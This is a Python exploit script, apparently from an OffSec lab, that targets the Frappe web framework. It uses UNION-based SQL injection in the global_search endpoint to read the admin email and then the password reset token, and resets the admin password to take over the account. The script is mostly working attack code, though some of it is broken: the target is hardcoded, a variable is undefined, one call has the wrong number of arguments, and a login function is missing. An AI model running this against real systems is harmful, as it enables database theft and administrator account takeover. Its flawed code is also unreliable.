import sys, re, os
import requests
import subprocess
import base64
import json
requests.packages.urllib3.disable_warnings()

def send_sql_comamnd(ip, command):
	target = f"http://192.168.247.123:8000"
	data = {
		"cmd": "frappe.utils.global_search.web_search",
		"text": "offsec",
		"scope": command
	}
	r = requests.post(target, data=data)
	resp = json.loads(r.text)
	if "message" not in resp:
		print("HTML request unsuccessful")
		exit(0)
	return resp["message"]

def get_admin_user_email(ip):
	command = "test_scope\" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#"

	output = send_sql_comamnd(ip, command)
	output = [i['route'] for i in output] # Filter to only last term 
	output = [i for i in output if ".com" in i] # Filter for email addresses

	if len(output) == 0:
		print("No valid users found")
		exit(0)

	if len(output) > 1:
		print(f"Multiple valid users found, using {output[0]}")

	admin_email = output[0]

	return admin_email

def send_reset_password(ip, admin_email):
	target = f"http://192.168.247.123:8000"
	data = {
		"cmd": "frappe.core.doctype.user.user.reset_password",
		"user": admin_email
	}
	r = requests.post(target, data=data)

	if "Password reset instructions" not in r.text:
		print("Password reset unsuccessful")
		exit(0)

	print("Password reset successful")

def get_password_reset_token(ip, admin_email):
	command = f"test_scope\" UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser WHERE name = \"{admin_email}\"#"

	output = send_sql_comamnd(ip, command)
	if len(output) != 1:
		print("Token not found")
		exit(0)

	token = output[0]['route']
	return token

def reset_password(ip, admin_email, token, password):
	target = f"http://192.168.247.123:8000"
	data = {
		"key": token,
		"old_password": "",
		"new_password": new_password,
		"cmd": "frappe.core.doctype.user.user.test_password_strength"
	}
	r = requests.post(target,data=data)
	if "feedback" in r.text and "guesses_log10" in r.text:
		print("Password reset successful!")
		print("New password: Pwnedpassword!")
		return

	print("Password reset unsuccessful")
	exit(0)

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    LPORT = 9001
    new_password = "Pwnedpassword!"

    admin_email = get_admin_user_email(ip)
    print(f"Admin email {admin_email} found!")

    print("Sending password reset......")
    send_reset_password(ip, admin_email)

    print("Searching for password reset token")
    token = get_password_reset_token(ip, admin_email)
    print(f"Sucessfully got reset token {token}")

    print("Restting password")
    reset_password(ip, admin_email, token)
    print("Password reset succesfully!")

    session = login(ip, admin_email)

if __name__ == '__main__':
	main()